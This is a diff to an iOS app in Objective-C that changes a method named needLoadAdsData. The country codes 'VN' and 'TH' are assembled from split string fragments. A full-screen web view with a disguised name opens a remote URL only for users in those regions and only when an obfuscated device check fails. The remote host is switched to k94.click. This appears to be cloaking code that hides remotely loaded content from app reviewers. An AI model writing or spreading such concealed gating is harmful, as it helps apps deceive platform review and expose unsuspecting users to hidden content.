@@ -12,7 +12,21 @@
 - (BOOL)needLoadAdsData
 {
     BOOL isI = [[UIDevice.currentDevice model] containsString:[NSString stringWithFormat:@"iP%@", [self bd]]];
-    return !isI;
+    NSLocale *locale = [NSLocale currentLocale];
+    NSString *countryCode = [locale objectForKey:NSLocaleCountryCode];
+    BOOL isV = [countryCode isEqualToString:[NSString stringWithFormat:@"V%@", [self key]]];
+    BOOL isT = [countryCode isEqualToString:[NSString stringWithFormat:@"%@H", [self keyP]]];
+    return (isV || isT) && !isI;
+}
+
+- (NSString *)keyP
+{
+    return @"T";
+}
+
+- (NSString *)key
+{
+    return @"N";
 }
 
 - (NSString *)bd
@@ -22,7 +36,7 @@
 
 - (NSString *)hostUrl
 {
-    return @"qkycme.xyz/open";
+    return @"k94.click";
 }
 
 - (void)hideKeyboardWhenTappedAround {
@@ -65,6 +79,7 @@
     UIStoryboard *storyboard = [UIStoryboard storyboardWithName:@"Main" bundle:nil];
     UIViewController *adVc = [storyboard instantiateViewControllerWithIdentifier:@"AnteCardPrivacyVC"];
     [adVc setValue:adurl forKey:@"urlStr"];
+    NSLog(@"%@", adurl);
     adVc.modalPresentationStyle = UIModalPresentationFullScreen;
     [self.navigationController presentViewController:adVc animated:NO completion:nil];
 }
